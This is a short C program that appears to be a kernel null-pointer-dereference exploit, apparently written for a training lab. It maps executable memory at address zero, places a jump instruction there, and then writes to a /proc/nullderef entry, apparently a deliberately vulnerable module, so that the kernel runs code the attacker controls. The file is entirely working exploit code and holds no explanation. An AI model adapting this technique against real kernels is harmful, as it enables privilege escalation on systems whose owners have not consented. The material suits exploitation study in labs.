#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

char payload [] = "\xe9\x3c\x41\x41\x41";

int main(){

  mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, \
                 MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memcpy(0, payload, sizeof(payload));

  int fd = open("/proc/nullderef", O_WRONLY);
  write(fd, "null dereference", 3);
}

